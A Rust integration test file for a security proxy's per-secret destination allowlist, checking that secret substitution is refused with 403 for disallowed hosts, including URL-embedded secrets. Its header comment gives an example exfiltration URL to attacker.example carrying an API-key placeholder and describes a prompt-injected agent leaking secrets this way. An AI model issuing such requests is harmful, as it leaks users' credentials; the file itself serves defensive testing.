// Holding ENV_MUTEX across .await is narrowly OK here — same pattern
// as the sibling vault_route.rs and substitution_body_headers.rs tests.
#![allow(clippy::await_holding_lock)]

//! Behavioral tests for the per-secret destination allowlist
//! (RFC §11.1).
//!
//! The allowlist binds each secret name to a list of host patterns
//! it may flow to. Without it, a prompt-injected agent that calls
//! `https://attacker.example/?key={{secret:ANTHROPIC_API_KEY}}` would
//! get the substitution dutifully performed and the value exfiltrated.
//! With it, the substitution is gated on destination host BEFORE the
//! resolver is even consulted (so the secret value isn't even loaded
//! into memory for an untrusted destination).
//!
//! Each test spins up a wiremock upstream + a real in-process gateway,
//! configures the allowlist, sends a request through, and asserts on
//! what (if anything) the upstream received.

use std::collections::HashMap;
use std::sync::Arc;
use std::sync::Mutex;

use adversary_detector::{RateLimitConfig, ScannerConfig};
use security_proxy::build_app;
use security_proxy::config::GatewayConfig;
use security_proxy::proxy::SecurityProxy;
use wiremock::matchers::{header, method};
use wiremock::{Mock, MockServer, ResponseTemplate};

static ENV_MUTEX: Mutex<()> = Mutex::new(());

fn set_env<K: AsRef<std::ffi::OsStr>, V: AsRef<std::ffi::OsStr>>(key: K, value: V) {
    unsafe { std::env::set_var(key, value) }
}

fn remove_env<K: AsRef<std::ffi::OsStr>>(key: K) {
    unsafe { std::env::remove_var(key) }
}

async fn spawn_gateway(allowlist: HashMap<String, Vec<String>>) -> (String, MockServer) {
    let upstream = MockServer::start().await;

    let proxy = SecurityProxy::new(
        GatewayConfig {
            scan_outbound: false,
            scan_inbound: false,
            bypass_domains: vec![],
            secret_destination_allowlist: allowlist,
            ..GatewayConfig::default()
        },
        ScannerConfig::default(),
        RateLimitConfig::default(),
    )
    .await;

    let app = build_app(Arc::new(proxy));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(listener, app).await.unwrap();
    });

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_millis(100))
        .build()
        .unwrap();
    let base = format!("http://{addr}");
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
    while std::time::Instant::now() < deadline {
        if client
            .get(format!("{base}/health"))
            .send()
            .await
            .is_ok_and(|r| r.status().is_success())
        {
            return (base, upstream);
        }
        tokio::time::sleep(std::time::Duration::from_millis(5)).await;
    }
    panic!("spawn_gateway: health did not become ready within 2s");
}

/// Given no allowlist entry for `TDA_BASE_API_KEY`,
/// when a header containing `{{secret:tda_base}}` flows to any host,
/// then substitution proceeds (preserves pre-feature behavior so this
/// is opt-in).
///
/// Failing this test would indicate accidental "deny by default"
/// behavior — every existing deployment would break on upgrade.
#[tokio::test]
async fn no_allowlist_entry_means_no_restriction() {
    let _lock = ENV_MUTEX.lock().unwrap_or_else(|e| e.into_inner());
    remove_env("SECRETS_VAULT_TOKEN");
    remove_env("SECRETS_VAULT_URL");
    set_env("TDA_BASE_API_KEY", "value-base");

    let (gateway, upstream) = spawn_gateway(HashMap::new()).await;
    Mock::given(method("GET"))
        .and(header("x-api-key", "value-base"))
        .respond_with(ResponseTemplate::new(204))
        .expect(1)
        .mount(&upstream)
        .await;

    let proxy_client = reqwest::Client::builder()
        .proxy(reqwest::Proxy::all(&gateway).unwrap())
        .build()
        .unwrap();
    let resp = proxy_client
        .get(format!("{}/anywhere", upstream.uri()))
        .header("X-Api-Key", "{{secret:tda_base}}")
        .send()
        .await
        .expect("request reached upstream");
    assert_eq!(resp.status(), 204);

    remove_env("TDA_BASE_API_KEY");
}

/// Given an allowlist entry for `TDA_MATCH_API_KEY` containing the
/// upstream's host pattern,
/// when a header with `{{secret:tda_match}}` flows to that upstream,
/// then substitution proceeds and upstream sees the value.
#[tokio::test]
async fn allowlist_with_matching_host_pattern_substitutes() {
    let _lock = ENV_MUTEX.lock().unwrap_or_else(|e| e.into_inner());
    remove_env("SECRETS_VAULT_TOKEN");
    remove_env("SECRETS_VAULT_URL");
    set_env("TDA_MATCH_API_KEY", "value-match");

    // Spawn the upstream first so we know its host pattern.
    let upstream = MockServer::start().await;
    let upstream_host = reqwest::Url::parse(&upstream.uri())
        .unwrap()
        .host_str()
        .unwrap()
        .to_string();

    Mock::given(method("GET"))
        .and(header("x-api-key", "value-match"))
        .respond_with(ResponseTemplate::new(204))
        .expect(1)
        .mount(&upstream)
        .await;

    // Now spawn the gateway with the allowlist entry pointing at the
    // upstream's actual host.
    let mut allow = HashMap::new();
    allow.insert("tda_match".into(), vec![upstream_host]);
    let proxy = SecurityProxy::new(
        GatewayConfig {
            scan_outbound: false,
            scan_inbound: false,
            bypass_domains: vec![],
            secret_destination_allowlist: allow,
            ..GatewayConfig::default()
        },
        ScannerConfig::default(),
        RateLimitConfig::default(),
    )
    .await;
    let app = build_app(Arc::new(proxy));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(listener, app).await.unwrap();
    });
    let gateway = format!("http://{addr}");
    // Wait for readiness.
    let probe = reqwest::Client::builder()
        .timeout(std::time::Duration::from_millis(100))
        .build()
        .unwrap();
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
    while std::time::Instant::now() < deadline {
        if probe
            .get(format!("{gateway}/health"))
            .send()
            .await
            .is_ok_and(|r| r.status().is_success())
        {
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(5)).await;
    }

    let proxy_client = reqwest::Client::builder()
        .proxy(reqwest::Proxy::all(&gateway).unwrap())
        .build()
        .unwrap();
    let resp = proxy_client
        .get(format!("{}/ok", upstream.uri()))
        .header("X-Api-Key", "{{secret:tda_match}}")
        .send()
        .await
        .expect("request reached upstream");
    assert_eq!(resp.status(), 204);

    remove_env("TDA_MATCH_API_KEY");
}

/// Given an allowlist entry that ONLY allows substitution for
/// `*.anthropic.com`,
/// when a header with `{{secret:tda_locked}}` flows to a different
/// host (the wiremock upstream),
/// then substitution is REFUSED — gateway returns 403, upstream is
/// never hit, and the response body does not echo the secret name.
///
/// This is the headline §11.1 attack: a prompt-injected agent
/// constructing a request to attacker-controlled host. Without this
/// check, the gateway would substitute and exfiltrate.
#[tokio::test]
async fn allowlist_blocks_substitution_to_disallowed_host() {
    let _lock = ENV_MUTEX.lock().unwrap_or_else(|e| e.into_inner());
    remove_env("SECRETS_VAULT_TOKEN");
    remove_env("SECRETS_VAULT_URL");
    // Even setting the value — substitution should never get to the
    // resolver because the allowlist gate fires first.
    set_env("TDA_LOCKED_API_KEY", "should-never-leave-the-process");

    let mut allow = HashMap::new();
    allow.insert("tda_locked".into(), vec!["api.anthropic.com".into()]);
    let (gateway, upstream) = spawn_gateway(allow).await;

    // Mount a handler that should never be hit.
    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(204))
        .expect(0)
        .mount(&upstream)
        .await;

    let proxy_client = reqwest::Client::builder()
        .proxy(reqwest::Proxy::all(&gateway).unwrap())
        .build()
        .unwrap();
    let resp = proxy_client
        .get(format!("{}/exfil", upstream.uri()))
        .header("X-Api-Key", "{{secret:tda_locked}}")
        .send()
        .await
        .expect("gateway returns SOME response");
    assert_eq!(resp.status(), 403, "disallowed dest must be 403");

    let body = resp.text().await.unwrap_or_default();
    assert!(
        !body.contains("should-never-leave-the-process"),
        "body must not echo the secret value"
    );
    assert!(
        !body.contains("tda_locked"),
        "body must not echo the secret name"
    );

    remove_env("TDA_LOCKED_API_KEY");
}

/// Given an allowlist entry with an EMPTY pattern list for
/// `TDA_DISABLED_API_KEY`,
/// when a substitution is attempted to any host,
/// then it's denied. This is the explicit-lockdown semantic — present
/// with empty list = "this secret is configured to never substitute".
/// Distinct from "absent entry" which means "no restriction".
#[tokio::test]
async fn empty_allowlist_locks_secret_completely() {
    let _lock = ENV_MUTEX.lock().unwrap_or_else(|e| e.into_inner());
    remove_env("SECRETS_VAULT_TOKEN");
    remove_env("SECRETS_VAULT_URL");
    set_env("TDA_DISABLED_API_KEY", "irrelevant");

    let mut allow = HashMap::new();
    allow.insert("tda_disabled".into(), vec![]);
    let (gateway, upstream) = spawn_gateway(allow).await;

    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(204))
        .expect(0)
        .mount(&upstream)
        .await;

    let proxy_client = reqwest::Client::builder()
        .proxy(reqwest::Proxy::all(&gateway).unwrap())
        .build()
        .unwrap();
    let resp = proxy_client
        .get(format!("{}/x", upstream.uri()))
        .header("X-Api-Key", "{{secret:tda_disabled}}")
        .send()
        .await
        .expect("gateway responds");
    assert_eq!(
        resp.status(),
        403,
        "empty-allowlist secret must never substitute"
    );

    remove_env("TDA_DISABLED_API_KEY");
}

/// Given an allowlist entry with a wildcard pattern `api.example.*`,
/// when the destination matches the wildcard,
/// then substitution proceeds. Confirms the allowlist reuses the same
/// glob-style host matching as `bypass_domains` (per the
/// `host_matches_pattern` regression-guard tests in proxy.rs).
#[tokio::test]
async fn allowlist_wildcard_pattern_matches() {
    let _lock = ENV_MUTEX.lock().unwrap_or_else(|e| e.into_inner());
    remove_env("SECRETS_VAULT_TOKEN");
    remove_env("SECRETS_VAULT_URL");
    set_env("TDA_GLOB_API_KEY", "via-glob");

    // wiremock binds to 127.0.0.1; pattern uses 127.* so it should
    // match. (Explicit IPv4 form — glob doesn't cross dots, so 127.*
    // matches 127.0.0.1 only with `127.*.*.*` style; pick the right
    // shape.)
    let mut allow = HashMap::new();
    allow.insert("tda_glob".into(), vec!["127.*.*.*".into()]);
    let (gateway, upstream) = spawn_gateway(allow).await;

    Mock::given(method("GET"))
        .and(header("x-api-key", "via-glob"))
        .respond_with(ResponseTemplate::new(204))
        .expect(1)
        .mount(&upstream)
        .await;

    let proxy_client = reqwest::Client::builder()
        .proxy(reqwest::Proxy::all(&gateway).unwrap())
        .build()
        .unwrap();
    let resp = proxy_client
        .get(format!("{}/g", upstream.uri()))
        .header("X-Api-Key", "{{secret:tda_glob}}")
        .send()
        .await
        .expect("request reached upstream");
    assert_eq!(resp.status(), 204);

    remove_env("TDA_GLOB_API_KEY");
}

/// Given an allowlist that ONLY allows `api.anthropic.com`,
/// when the agent embeds the secret into the URL itself
/// (`?key={{secret:NAME}}` against the wiremock upstream),
/// then substitution is REFUSED — the URL-substitution path also
/// honors the per-secret allowlist (closes a bypass where header/body
/// substitution was gated but URL substitution wasn't).
///
/// Regression guard for the bug found by triage on PR #22:
/// `substitute_url()` previously always passed `None` for dest_host,
/// so any secret could be exfiltrated by URL-embedding it.
#[tokio::test]
async fn allowlist_blocks_url_embedded_secret_to_disallowed_host() {
    let _lock = ENV_MUTEX.lock().unwrap_or_else(|e| e.into_inner());
    remove_env("SECRETS_VAULT_TOKEN");
    remove_env("SECRETS_VAULT_URL");
    set_env("TDA_URL_API_KEY", "should-never-leave-the-process");

    let mut allow = HashMap::new();
    allow.insert("tda_url".into(), vec!["api.anthropic.com".into()]);
    let (gateway, upstream) = spawn_gateway(allow).await;

    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(204))
        .expect(0)
        .mount(&upstream)
        .await;

    let proxy_client = reqwest::Client::builder()
        .proxy(reqwest::Proxy::all(&gateway).unwrap())
        .build()
        .unwrap();
    let resp = proxy_client
        .get(format!("{}/x?key={{{{secret:tda_url}}}}", upstream.uri()))
        .send()
        .await
        .expect("gateway responds");
    assert_eq!(
        resp.status(),
        403,
        "URL-embedded secret to disallowed host must be 403"
    );

    let body = resp.text().await.unwrap_or_default();
    assert!(
        !body.contains("should-never-leave-the-process"),
        "body must not echo the secret value"
    );

    remove_env("TDA_URL_API_KEY");
}
